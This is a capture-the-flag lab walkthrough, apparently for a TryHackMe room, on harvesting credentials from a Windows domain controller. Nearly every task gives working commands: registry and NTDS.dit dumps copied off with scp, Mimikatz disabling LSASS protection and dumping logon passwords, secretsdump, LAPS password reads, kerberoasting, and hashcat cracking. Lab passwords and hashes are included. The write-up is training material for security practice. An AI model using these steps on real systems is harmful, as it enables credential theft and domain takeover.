# Credentials Harvesting

## High-Level Overview

Exploit different authentication models using a red team approach.

## Tools Needed

* BloodHound
* Impacket
* Mimikatz
* RunAs

## Walkthrough

We are provided a Windows Server 2019 that has been configured as a Domain Controller (DC). We are tasked with harvesting credentials from this machine in a few ways.

This machine can be accessed either via RDP (`thm`:`Passw0rd!`) or in-browser view.

```bash
$ xfreerdp /v:MACHINE:IP /u:thm /p:Passw0rd!
```

### Task 3

For this task, we need to enumerate through Windows registry to find a password. We can open a new `cmd` window and type the following queries:

```powershell
> reg query HKLM /f flag /t REG_SZ /s | findstr THM
> reg query HKEY_LOCAL_MACHINE\SYSTEM\THM
```

In the output we can see our password and the first flag.

For our second flag, we need to open a `PowerShell` prompt and search for the password using the query:

```powershell
Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description
```

We can see the user `THM Victim` has a note attached. This is our second flag.

### Task 4

For this task, we will be dumping the SAM database content through the Windows Registry. On our victim DC machine we can open a `cmd` window and type the commands:

```powershell
> reg save HKLM\sam C:\users\sam-reg
> reg save HKLM\system C:\users\system-reg
```

Transfer the files on the attacking machine using `scp`. Type the following commands on your attacking machine:

```bash
$ scp thm\\thm@DC_MACHINE:IP:C:/users/sam-reg .
$ scp thm\\thm@DC_MACHINE:IP:C:/users/system-reg .
```

Now we will use `Impacket secretsdump.py` to decrypt the SAM and system files by running this command on our attacking machine:

```bash
$ impacket-secretsdump -sam sam-reg -system system-reg LOCAL
```

Now we should have the NTLM hash for the Administrator account, which is also what we need to answer the question for this task.

### Task 5

For this task, we will leverage our Administrator privileges amd exploit LSASS.

Open a PowerShell window as Administrator and open `Mimikatz`, which can be found on the victim machine at `C:\Tools\Mimikatz`:

```powershell
> C:\Tools\Mimikatz\mimikatz.exe
```

However, LSA appears to be protected, and we can't dump credentials from memory that easily. We can also use `Mimikatz` to disable the protection and successfully dump the credentials using the following commands:

```powershell
> privilege::debug
> !+
> !processprotect /process:lsass.exe /remove
> sekurlsa::logonpasswords
```

### Task 6

First, we need to use `Get-WebCredentials.ps1` script (already located on the machine at `C:\Tools\`). We will use this script to dump the credentials from the Windows vault for web credentials of Windows Credential Manager.

Open a PowerShell window as Administrator and type the commands:

```powershell
> cd C:\Tools
> Import-Module C:\Tools\Get-WebCredentials.ps1
> Get-WebCredentials
```

Next, we need to use `Mimikatz` to extract clear-text passwords from Windows Credential Manager. We will open a `cmd` window as Administrator, and use the following commands:

```powershell
> C:\Tools\Mimikatz\mimikatz.exe
> privilege::debug
> sekurlsa::credman
```

Additionally, we will need to use `RunAs` to run `cmd` as the user `thm-local` and read the flag located in `C:\Users\thm-local\Saved Games\flag.txt`

```powershell
> runas /savecred /user:THM.red\thm-local cmd.exe
```

In the newly opened `cmd` window type the command:

```powershell
> type "C:\Users\thm-local\Saved Games\flag.txt"
```

### Task 7

For this task, we need to dump DC hashes locally. To do this, we will need to dump the following files:

* `C:\Windows\NTDS\ntds.dit`
* `C:\Windows\System32\config\SYSTEM`
* `C:\Windows\System32\config\SECURITY`

We can do this by opening a `PowerShell` window and use the following command:

```powershell
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

If the command executes successfully, we will have some folders located at `C:\temp` that we need to transfer to our attacking machine using scp:

```bash
$ scp -r thm\\thm@DC_MACHINE:IP:'C:/temp/Active Directory' .
$ scp -r thm\\thm@DC_MACHINE:IP:'C:/temp/registry' .
```

On our attacking machine, using `Impacket-secretsdump.py`, we can extract the hashes from the dumped memory file using the following command:

```bash
$ impacket-secretsdump -system registry/SYSTEM  -security registry/SECURITY -ntds 'Active Directory/ntds.dit' local
# run this command in the directory that contains the directories you moved from the DC
```

We will take the password hash for the `bk-admin` username and put it in a file, then we will use `hashcat` to try and crack it:

```bash
$ echo thm.red\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: > hash
$ hashcat -m 1000 -a 0 hash /usr/share/wordlists/rockyou.txt --force
```

And now we should have the password in the output.

### Task 8

We will open a `PowerShell` window and enumerate this machine for LAPS using the following commands:

```powershell
> dir "C:\Program Files\LAPS\CSE"
> Get-Command *AdmPwd*
> Find-AdmPwdExtendedRights -identity THMorg
> net groups "LAPsReader"
```

We see that the user `bk-admin` is part of this group. Luckily, we know his password from a previous task so we can get the LAPS password by impersonating him. Use `RunAs` to open a `cmd` as `bk-admin`, then type in the following commands:

```powershell
> runas /user:bk-admin cmd.exe
# password is Passw0rd123
> powershell
> Get-AdmPwdPassword -ComputerName creds-harvesting
```

### Task 9

For this task we need to perform a kerberoasting attack. First we need to find an SPN account, and then send a request to get a TGS ticket. We can do this from our attacking machine using `Impacket-GetUserSPNs`.

```bash
# first we find out the service account using this command
$ impacket-GetUserSPNs -dc-ip MACHINE:IP THM.red/thm
# when asked for the password supply the password provided in task 2
# then we use the known SPN account, svc-user to send a single request to get a TGS ticket for that user
$ impacket-GetUserSPNs -dc-ip MACHINE:IP THM.red/thm -request-user svc-thm
```

The TGS that we get can be seen in the output below:

```
$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$e9782bde3144cf7b43adb29403fcf1d9$cfbd50edd808921866dcaf6635ba7638141c837881eb959a41cc83f9f96eb6e7e295600e7541068fb78c6de94e3e4903dfcdede42006f7a7d14720d05230a69d93284feb397f47e545eb9b1240d5eeda8e228b1a40ff1116f70b10c7680c63c0112a6d635df0952941c996f6209a6ab12b44f24ecd431368027a9fa355e3ea9f8826a4fba55df3f71a3b3e3af5033fe87c370dca3c39b553750b598864b6e10b350dfb27e6eaf30bd7fd0faffc5cb2c0bc581bd379489c791a2a1e6fb0fffdbc26f34b70e81b71f516e7f9b2d2ec9e39c05185b5f2a740531442d81718a048d2800b5044b589b78e4cd2abc69169b1e5018eeb77133446dad590b6bbfb0b1278dbc034f0524d410e65760ea47c26564fa116503789c3eb453f28c6e7dada4ff40ddefa5d851fb772714f135dad856e432032a8edc754cd92211637771c265c2daabcd573eda0df7bdbf2d6aa38a1e3ce08603657cc23de43cab58452cb9908ed2d8999b864aaa9b7b565bed472947641d381e43ff7b2da74809812312312e76712067c3f12e387a13695fd7442b68442bc6cc308af102ddcc252d4ffaee5481937f8c1b460ad4d28d976e29865b7dbdad16e602b7a3e36f3c9032b5a9b47c92a5be64a057f2624e71e61c41ed4143410eaeab4520cc97bdca35e12efd1538b5155e7bb7871e2d945a8f74721ba8f7197bf713514d629393da72e1a36e016c0d9c60896f331cf42f7d3756370ce7d23f0a3521249b63394c6c75c01288de7f00694ac8d44e468ba180c4956ee0dc3c3f4dbbe74c04d41565ebbdf3259f478119d22d49ee11a629bb7c78efbaa15a25d8ad9e4e0d1645c2bbe8798c11190f45c7a94dc76b6b31ea7081ede64a7a2a3c959dee49381fd70e2653be93742e0f6d19bfde5bb890462c0439bfc5175532c19f289058d399ba8ca8b11fc8de5aea2bb6e1d493a3f167bbabc58ce2571d3ac761a60384c8b0eae31eec33ea2d916b5809cddb84ea77c6aa0f6c98bfec7c25adefdff5e0c3d458498bca555cee7558123c78171ad285116c00dce1db2ca2bb2626977a4a5171a0ccbfbf481ede4b460e932624a27f5580606cafc33c96ae766d00a1f73c1b8ff0823e5fd2209cf2097df25ca153c1bcd10a2e948dd5b3900bb680ccb64d817abbea78ca1a5cab098765e10f3c90c8e0eaad58a047caf0173e21fabfbc2cd3778ccb31bf6e92ee69abaa59c510bc7e6eadd7b5847d18dafb36802d4b4545e3216453743
```

We can save this to a file named `spn`. Now we can crack the obtained TGS ticket using `HashCat` by running the following command on our attacking machine:

```bash
$ hashcat -a 0 -m 13100 spn /usr/share/wordlists/rockyou.txt 
```

With the known username and the password, we can answer the final questions for this challenge.